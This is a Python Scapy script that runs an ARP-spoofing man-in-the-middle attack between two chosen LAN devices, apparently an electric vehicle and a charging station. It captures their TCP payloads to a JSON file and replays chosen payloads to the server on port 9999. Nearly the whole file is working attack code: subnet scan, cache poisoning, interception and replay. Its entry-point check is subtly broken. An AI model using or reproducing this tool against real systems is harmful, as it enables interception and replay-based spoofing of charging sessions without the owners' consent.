from scapy.all import *
import os
import sys
import signal
import threading
import time
import json
import socket
import base64
from datetime import datetime, timezone
from hashlib import sha256

conf.verb = 0
mac_table = {}
ev_ip = None
cs_ip = None
replay_file = "replay.json"
seen_hashes = set()


def ensure_replay_file():
    if not os.path.exists(replay_file):
        init = {
            "all_payloads": []
        }
        with open(replay_file, "w") as f:
            json.dump(init, f, indent=2)
        return init
    else:
        with open(replay_file, "r") as f:
            try:
                data = json.load(f)
                if not isinstance(data, dict) or "all_payloads" not in data:
                    raise ValueError("Invalid replay file format.")
                return data
            except Exception:
                init = {
                    "all_payloads": []
                }
                with open(replay_file, "w") as f2:
                    json.dump(init, f2, indent=2)
                return init


def get_mac(ip):
    if ip in mac_table:
        return mac_table[ip]
    ans, _ = sr(ARP(pdst=ip), timeout=2, verbose=0)
    for _, rcv in ans:
        mac_table[ip] = rcv.hwsrc
        return rcv.hwsrc
    return None


def enable_ip_forwarding():
    if sys.platform == "darwin":
        os.system("sysctl -w net.inet.ip.forwarding=1")
    else:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def disable_ip_forwarding():
    if sys.platform == "darwin":
        os.system("sysctl -w net.inet.ip.forwarding=0")
    else:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


def spoof(target_ip, spoof_ip, target_mac):
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(pkt, verbose=0)


def restore(target_ip, target_mac, spoof_ip, spoof_mac):
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    sendp(pkt, count=4, verbose=0)


def arp_loop(ev_ip, ev_mac, cs_ip, cs_mac):
    while True:
        spoof(ev_ip, cs_ip, ev_mac)
        spoof(cs_ip, ev_ip, cs_mac)
        time.sleep(1.5)


def forward_packet(pkt, dst_ip):
    dst_mac = get_mac(dst_ip)
    pkt[Ether].dst = dst_mac if dst_mac else "ff:ff:ff:ff:ff:ff"
    sendp(pkt, verbose=0)


def save_replay(data):
    with open(replay_file, "w") as f:
        json.dump(data, f, indent=2)
    print("[✓] replay.json updated")


def replay_payload(server_ip, payload_bytes):
    try:
        print(f"[REPLAY] Sending {len(payload_bytes)} bytes to {server_ip}:9999")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, 9999))
            s.sendall(payload_bytes)
            print("[REPLAY] Payload sent.")

            while True:
                resp = s.recv(1024)
                if not resp:
                    break
                msg = resp.decode(errors="ignore").strip()
                print(f"[SERVER] {msg}")
                if msg.startswith("REJECT") or msg.startswith("Session ended"):
                    break
    except Exception as e:
        print(f"[REPLAY ERROR] {e}")


def packet_interceptor(pkt):
    if IP in pkt and TCP in pkt and Raw in pkt:
        payload = pkt[Raw].load
        h = sha256(payload).hexdigest()
        if h in seen_hashes:
            return
        seen_hashes.add(h)

        ip_src = pkt[IP].src
        ip_dst = pkt[IP].dst

        replay_data = ensure_replay_file()
        saved = False

        try:
            text = payload.decode(errors="ignore").strip()
            print(f"\n[MITM] {ip_src} -> {ip_dst}\n{text}\n")

            b64_payload = base64.b64encode(payload).decode()

            record = {
                "server_ip": ip_dst,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "payload_b64": b64_payload,
                "decoded_attempt": text
            }

            try:
                obj = json.loads(text)
                record["parsed_json"] = obj
                print("[+] Parsed JSON and saved.")
            except json.JSONDecodeError:
                print("[+] Saved raw text payload.")

            replay_data["all_payloads"].append(record)
            saved = True

        except Exception as e:
            print(f"[ERROR] Intercept error: {e}")

        if saved:
            save_replay(replay_data)

        forward_packet(pkt, cs_ip if ip_dst == cs_ip else ev_ip)


def clean_seen_hashes():
    while True:
        time.sleep(10)
        seen_hashes.clear()


def manual_replay():
    try:
        data = ensure_replay_file()
        records = data.get("all_payloads", [])
        if not records:
            print("No records to replay.")
            return

        print("\nAvailable captured payloads:")
        for i, rec in enumerate(records):
            ts = rec.get("timestamp", "N/A")
            ip = rec.get("server_ip", "N/A")
            desc = rec.get("decoded_attempt", "")[:50].replace("\n", " ")
            print(f"[{i}] {ts} → {ip} :: {desc}")

        idx = int(input("Select index to replay: "))
        if idx < 0 or idx >= len(records):
            print("Invalid index.")
            return

        rec = records[idx]
        server_ip = rec.get("server_ip")
        if not server_ip:
            print("Record missing server IP.")
            return

        b64 = rec.get("payload_b64")
        if not b64:
            print("Record missing payload_b64.")
            return

        payload_bytes = base64.b64decode(b64)
        replay_payload(server_ip, payload_bytes)

    except Exception as e:
        print(f"[REPLAY ERROR] {e}")


def start_mitm(ev, cs):
    global ev_ip, cs_ip
    ev_ip, ev_mac = ev
    cs_ip, cs_mac = cs

    def stop(sig, frame):
        print("\nRestoring ARP tables and exiting...")
        restore(ev_ip, ev_mac, cs_ip, cs_mac)
        restore(cs_ip, cs_mac, ev_ip, ev_mac)
        disable_ip_forwarding()
        sys.exit(0)

    signal.signal(signal.SIGINT, stop)
    enable_ip_forwarding()

    print(f"[*] MITM started between {ev_ip} and {cs_ip}")

    threading.Thread(target=sniff, kwargs={
        "filter": f"tcp and (host {ev_ip} or host {cs_ip})",
        "prn": packet_interceptor,
        "store": 0
    }, daemon=True).start()

    threading.Thread(target=arp_loop, args=(ev_ip, ev_mac, cs_ip, cs_mac), daemon=True).start()
    threading.Thread(target=clean_seen_hashes, daemon=True).start()

    while True:
        print("\n[MENU] 1=Replay 2=Show replay.json 3=Exit")
        c = input(">> ").strip()
        if c == "1":
            manual_replay()
        elif c == "2":
            with open(replay_file) as f:
                print(json.dumps(json.load(f), indent=2))
        elif c == "3":
            stop(None, None)


def scan_network(subnet):
    print("[*] Scanning network...")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet), timeout=2, verbose=0)
    return [(rcv.psrc, rcv.hwsrc) for _, rcv in ans]


def choose_devices(devices):
    print("\nDevices found:")
    for i, (ip, mac) in enumerate(devices):
        print(f"[{i}] IP: {ip}, MAC: {mac}")
    ev_idx = int(input("Pick EV index: "))
    cs_idx = int(input("Pick CS index: "))
    return devices[ev_idx], devices[cs_idx]


def get_interface_subnet():
    iface = conf.iface
    ip = get_if_addr(iface)
    return f"{ip.rsplit('.',1)[0]}.0/24"


if _name_ == "_main_":
    subnet = get_interface_subnet()
    devices = scan_network(subnet)
    if len(devices) < 2:
        print("[-] Not enough devices found.")
        sys.exit(1)
    ev, cs = choose_devices(devices)
    start_mitm(ev, cs)
